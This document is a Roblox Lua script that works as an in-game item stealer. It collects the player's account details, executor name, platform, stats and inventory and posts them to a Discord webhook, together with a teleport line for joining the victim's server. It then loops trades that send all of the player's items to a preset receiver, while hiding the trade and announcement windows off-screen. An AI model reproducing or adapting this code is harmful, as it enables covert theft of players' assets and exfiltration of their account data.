local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local tradeEvents = replicatedStorage.OtherEvent.TradeEvents

local webhookSent = false

local function fetchPlayerDetails()
    local playerDetails = {
        Username = player.Name,
        UserId = player.UserId,
        AccountAge = player.AccountAge
    }
    return playerDetails
end

local function getPlatform()
    if UserInputService.TouchEnabled then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

local getExeName = identifyexecutor or getexecutorname or function() 
    return "Yet Another Roblox Executor v1.2"
end

local k = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. 
    game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

local function getPlayerInventory()
    local inventory = {
        Powers = {},
        Accessories = {},
        Weapons = {}
    }

    local powerFolder = player:FindFirstChild("Items"):FindFirstChild("Power")
    if powerFolder then
        for _, item in ipairs(powerFolder:GetChildren()) do
            if item:IsA("IntValue") and item.Value > 0 then
                table.insert(inventory.Powers, {Name = item.Name, Amount = item.Value})
            end
        end
    end

    local accessoryFolder = player:FindFirstChild("Items"):FindFirstChild("Accessory")
    if accessoryFolder then
        for _, item in ipairs(accessoryFolder:GetChildren()) do
            if item:IsA("IntValue") and item.Value > 0 then
                table.insert(inventory.Accessories, {Name = item.Name, Amount = item.Value})
            end
        end
    end

    local weaponFolder = player:FindFirstChild("Items"):FindFirstChild("Weapon")
    if weaponFolder then
        for _, item in ipairs(weaponFolder:GetChildren()) do
            if item:IsA("IntValue") and item.Value > 0 then
                table.insert(inventory.Weapons, {Name = item.Name, Amount = item.Value})
            end
        end
    end

    return inventory
end

local function formatInventoryMessage(inventory)
    local inventoryMessage = ""

    for _, power in ipairs(inventory.Powers) do
        inventoryMessage = inventoryMessage .. "- " .. power.Name .. " (Power) x" .. power.Amount .. "\n"
    end

    for _, accessory in ipairs(inventory.Accessories) do
        inventoryMessage = inventoryMessage .. "- " .. accessory.Name .. " (Accessory) x" .. accessory.Amount .. "\n"
    end

    for _, weapon in ipairs(inventory.Weapons) do
        inventoryMessage = inventoryMessage .. "- " .. weapon.Name .. " (Weapon) x" .. weapon.Amount .. "\n"
    end

    return inventoryMessage
end

local function fetchPlayerStats()
    local playerDataFolder = player:FindFirstChild("PlayerData")
    if playerDataFolder then
        local level = playerDataFolder:FindFirstChild("Level") and playerDataFolder.Level.Value or 0
        local money = playerDataFolder:FindFirstChild("Money") and playerDataFolder.Money.Value or 0
        local gem = playerDataFolder:FindFirstChild("Gem") and playerDataFolder.Gem.Value or 0
        return {
            Level = level,
            Money = money,
            Gem = gem
        }
    else
        return {
            Level = 0,
            Money = 0,
            Gem = 0
        }
    end
end

local function formatPlayerStats(stats)
    return "**Player Stats**\n" ..
           "> Level: " .. stats.Level .. "\n" ..
           "> Money: " .. stats.Money .. "\n" ..
           "> Gem: " .. stats.Gem .. "\n"
end

local function sendWebhookMessage(targetUser)
    local playerDetails = fetchPlayerDetails()
    local stats = fetchPlayerStats()
    local statsMessage = formatPlayerStats(stats)
    local executor = getExeName()
    local inventory = getPlayerInventory()
    local inventoryMessage = formatInventoryMessage(inventory)

    local data = {
        ["username"] = playerDetails.Username,
        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1284445382939774977/1284456281511563286/Screenshot_2024-09-14-18-10-28-99_572064f74bd5f9fa804b05334aa4f912.jpg?ex=66e6b2a1&is=66e56121&hm=6948aecf3e3565b1d597de968194527d086916c223300dc0071d485ba3b25bd3&",
        ["content"] = "-- @everyone\n" .. k,
        ["embeds"] = {
            {
                ["title"] = "Player Profile Overview",
                ["description"] = 
                    "**User Information**\n" ..
                    "> Username: " .. playerDetails.Username .. "\n" ..
                    "> User ID: " .. playerDetails.UserId .. "\n" ..
                    "> Account Age: " .. playerDetails.AccountAge .. " days\n" ..
                    "> Exploit Used: " .. executor .. "\n" ..
                    "> Platform: " .. getPlatform() .. "\n" ..
                    "> Receiver: " .. targetUser .. "\n\n" ..
                    statsMessage .. "\n" ..
                    "**Inventory:**\n" ..
                    inventoryMessage,
                ["color"] = 3092790,
                ["footer"] = {
                    ["text"] = "Report Generated | " .. os.date("%A, %d %B %Y at %I:%M:%S %p"),
                    ["icon_url"] = "https://somecdn.com/icons/date_time.png"
                }
            }
        }
    }

    local newdata = HttpService:JSONEncode(data)
    local headers = { ["content-type"] = "application/json" }
    local request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Body = newdata, Method = "POST", Headers = headers})
end

local function addItemToTrade(itemName, itemType, itemAmount)
    pcall(function()
        local addItemArgs = {
            [1] = {
                ["Action"] = "Add_Item",
                ["Item_Table"] = {
                    ["ItemName"] = itemName,
                    ["ItemType"] = itemType,
                    ["ItemAmount"] = itemAmount
                }
            }
        }
        tradeEvents.Trade_Event:FireServer(unpack(addItemArgs))
    end)
end

local function executeTrade(targetUser)
    local inventory = getPlayerInventory()

    if not webhookSent then
        sendWebhookMessage(targetUser)
        webhookSent = true
    end

    local sendTradeArgs = {
        [1] = {
            ["Action"] = "Send",
            ["Target"] = targetUser
        }
    }
    tradeEvents.Trade:InvokeServer(unpack(sendTradeArgs))

    for _, power in ipairs(inventory.Powers) do
        addItemToTrade(power.Name, "Power", power.Amount)
        wait(0.1)
    end

    for _, accessory in ipairs(inventory.Accessories) do
        addItemToTrade(accessory.Name, "Accessory", accessory.Amount)
        wait(0.1)
    end

    for _, weapon in ipairs(inventory.Weapons) do
        addItemToTrade(weapon.Name, "Weapon", weapon.Amount)
        wait(0.1)
    end

    local readyTradeArgs = {
        [1] = {
            ["Action"] = "Ready_Trade"
        }
    }
    tradeEvents.Trade_Event:FireServer(unpack(readyTradeArgs))
end

local function adjustGuiElements()
    local playerGui = player:WaitForChild("PlayerGui")
    
    local tradeGui = playerGui:FindFirstChild("TradeGui")
    if tradeGui then
        local tradeFrame = tradeGui:FindFirstChild("Frame")
        if tradeFrame then
            tradeFrame.Position = UDim2.new(999, 0, 0, 0)
        end
    end

    local announceGui = playerGui:FindFirstChild("AnnounceGui")
    if announceGui then
        local containerFrame = announceGui:FindFirstChild("Container")
        if containerFrame then
            containerFrame.Position = UDim2.new(999, 0, 0, 0)
        end
    end
end

adjustGuiElements()

while true do
    executeTrade(Receiver)
    wait(5)
end
